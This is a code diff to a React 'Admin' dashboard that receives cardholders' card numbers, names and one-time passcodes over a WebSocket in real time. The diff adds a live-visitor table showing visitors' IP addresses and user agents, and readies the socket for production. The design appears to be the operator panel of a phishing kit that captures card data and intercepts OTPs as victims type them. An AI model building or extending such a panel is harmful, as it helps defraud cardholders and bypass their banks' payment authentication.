@@ -29,21 +29,34 @@ interface OtpData {
   timestamp: string;
 }
 
+interface VisitorData {
+  id: string;
+  ipAddress: string;
+  timestamp: string;
+  userAgent: string;
+}
+
 const Admin = () => {
   const [socket, setSocket] = useState<Socket | null>(null);
   const [isConnected, setIsConnected] = useState(false);
   const [payments, setPayments] = useState<PaymentData[]>([]);
   const [otps, setOtps] = useState<OtpData[]>([]);
   const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
+  const [liveVisitors, setLiveVisitors] = useState<VisitorData[]>([]);
 
   useEffect(() => {
     try {
-      // Connect to WebSocket server with error handling
-      const newSocket = io('ws://localhost:3001', {
+      // Connect to WebSocket server with proper environment handling
+      const socketUrl = process.env.NODE_ENV === 'production' 
+        ? window.location.origin.replace(/^http/, 'ws')
+        : 'ws://localhost:3001';
+      
+      const newSocket = io(socketUrl, {
         timeout: 10000,
         reconnection: true,
         reconnectionAttempts: 5,
-        reconnectionDelay: 2000
+        reconnectionDelay: 2000,
+        transports: ['websocket', 'polling']
       });
       setSocket(newSocket);
 
@@ -72,7 +85,7 @@ const Admin = () => {
       });
 
       // Listen for new payment data with error handling
-      newSocket.on('payment-data', (data: Omit<PaymentData, 'id' | 'status'>) => {
+      newSocket.on('payment-received', (data: Omit<PaymentData, 'id' | 'status'>) => {
         try {
           if (!data || !data.cardNumber || !data.cardName) {
             console.error('Invalid payment data received:', data);
@@ -109,6 +122,37 @@ const Admin = () => {
           }
         } catch (error) {
           console.error('Error processing OTP data:', error);
+        }
+      });
+
+      // Listen for visitor join/leave events
+      newSocket.on('visitor-joined', (data: Omit<VisitorData, 'id'>) => {
+        try {
+          if (!data || !data.ipAddress) {
+            console.error('Invalid visitor data received:', data);
+            return;
+          }
+          
+          const newVisitor: VisitorData = {
+            ...data,
+            id: Date.now().toString() + Math.random().toString(36).substr(2, 9)
+          };
+          setLiveVisitors(prev => [newVisitor, ...prev]);
+        } catch (error) {
+          console.error('Error processing visitor data:', error);
+        }
+      });
+
+      newSocket.on('visitor-left', (data: { ipAddress: string }) => {
+        try {
+          if (!data || !data.ipAddress) {
+            console.error('Invalid visitor leave data received:', data);
+            return;
+          }
+          
+          setLiveVisitors(prev => prev.filter(visitor => visitor.ipAddress !== data.ipAddress));
+        } catch (error) {
+          console.error('Error processing visitor leave data:', error);
         }
       });
 
@@ -226,6 +270,68 @@ const Admin = () => {
                 <span className="text-red-400">Disconnected</span>
               </>
             )}
+          </div>
+        </div>
+
+        {/* Live Visitors Section */}
+        <div className="bg-gray-900 rounded-lg overflow-hidden mb-8">
+          <div className="p-6 border-b border-gray-700">
+            <h2 className="text-xl font-semibold">Live Visitors</h2>
+            <p className="text-gray-400 mt-1">Real-time website visitors ({liveVisitors.length} online)</p>
+          </div>
+          
+          <div className="overflow-x-auto">
+            <table className="w-full">
+              <thead className="bg-gray-800">
+                <tr>
+                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                    Timestamp
+                  </th>
+                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                    IP Address
+                  </th>
+                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                    User Agent
+                  </th>
+                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
+                    Status
+                  </th>
+                </tr>
+              </thead>
+              <tbody className="divide-y divide-gray-700">
+                {liveVisitors.length === 0 ? (
+                  <tr>
+                    <td colSpan={4} className="px-6 py-8 text-center text-gray-400">
+                      No live visitors at the moment
+                    </td>
+                  </tr>
+                ) : (
+                  liveVisitors.map((visitor) => (
+                    <tr key={visitor.id} className="hover:bg-gray-800">
+                      <td className="px-6 py-4 whitespace-nowrap text-sm">
+                        {new Date(visitor.timestamp).toLocaleString()}
+                      </td>
+                      <td className="px-6 py-4 whitespace-nowrap">
+                        <div className="bg-red-600 text-black px-3 py-1 rounded font-bold text-sm">
+                          {visitor.ipAddress}
+                        </div>
+                      </td>
+                      <td className="px-6 py-4 text-sm text-gray-300">
+                        <div className="max-w-xs truncate" title={visitor.userAgent}>
+                          {visitor.userAgent}
+                        </div>
+                      </td>
+                      <td className="px-6 py-4 whitespace-nowrap">
+                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
+                          <div className="w-2 h-2 bg-green-500 rounded-full mr-1.5 animate-pulse"></div>
+                          Online
+                        </span>
+                      </td>
+                    </tr>
+                  ))
+                )}
+              </tbody>
+            </table>
           </div>
         </div>
 
